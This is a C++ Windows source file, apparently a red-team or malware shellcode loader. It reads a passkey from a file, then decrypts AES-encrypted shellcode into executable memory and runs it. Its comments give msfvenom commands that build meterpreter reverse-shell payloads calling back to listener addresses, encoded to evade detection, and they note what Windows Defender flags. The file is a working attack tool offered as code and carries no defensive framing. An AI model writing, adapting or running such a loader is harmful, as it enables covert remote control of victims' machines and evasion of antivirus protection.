#include "Windows.h"
#include <iostream>
#include <stdio.h>   /* required for file operations */
#include <conio.h>  /* for clrscr */
#include <windns.h>
#include "sc.h"
#include "aes_library.h"

FILE* fp;            /* declare the file pointer */
char* FilePath;

#pragma warning(disable : 4996)

void AES256Decrypt(uint8_t* toDec, uint8_t* IV, const char* Key, size_t Size)
{
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, Key, IV);
	AES_CBC_decrypt_buffer(&ctx, toDec, Size);

	memcpy((char*)toDec + Size, "\x00", 1);
}

// Calc launcher - msfvenom -p windows/exec CMD=calc.exe -f C
// msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.186 LPORT=443 -f c --encrypt aes256 --encrypt-key 12345678901234567890123456789012 --encrypt-iv 1234567890123456
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.186 LPORT=443 EXITFUNC=thread -f c -e shikata_ga_nai

#define IV "1234567890123451"
#define KEY "12345678901234567890123456789011"

// msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LPORT=8080 LHOST=10.1.1.129 -e x86/shikata_ga_nai -f psh
//	Works on 1903, not on Razer
// 
//unsigned char shellcode[] = "\x90\x90";

DWORD getKey(void) {
	/*
		// Manually assign key (pinged by defender, but useful for debugging)
		DWORD key = 0x75636f64;
		return key;
	*/

	// Key will store the DWORD read from the file
	char buffer[4];

	// Option to either pass the filepath as an argument or statically code it
	// Filepath doesn't have to be fully qualified, just the filename containing the
	// 4 char XOR key is enough, so long as it is in the same folder

	fp = fopen("C:\\Users\\Public\\Documents\\test.txt", "rb");

	unsigned int uint;
	fread(&uint, 4, 4, fp);

	//Debuging line to check the input is correct
	printf("the memory address is: %x\n", uint);
	return uint;

}

int main(int argc, char* argv[]) {
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Define variables
	DWORD key;
	void* decryptedStager;

	// Init variables
	key = getKey();
	DWORD passkey = 0x646e7770; // 0x70776e64

	// Conditional Check for the passkey
	if (key != passkey) {
		printf("Incorrect passkey");
	}
	else {
		printf("Correct passkey, proceeding");

		size_t size = sizeof(shellcode);
		DWORD op = 0;

		// Debug pause prior to decryption of AES shellcode
		printf("[*] Debug Pause\n");
		getchar();

		// Create a RWX memory page
		void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		// Copy the shellcode into the memory page
		memcpy(exec, shellcode, sizeof shellcode);

		AES256Decrypt((uint8_t*)exec, (uint8_t*)IV, KEY, size);

		//getchar();

		((void(*)())exec)();
	}

	return 0;
}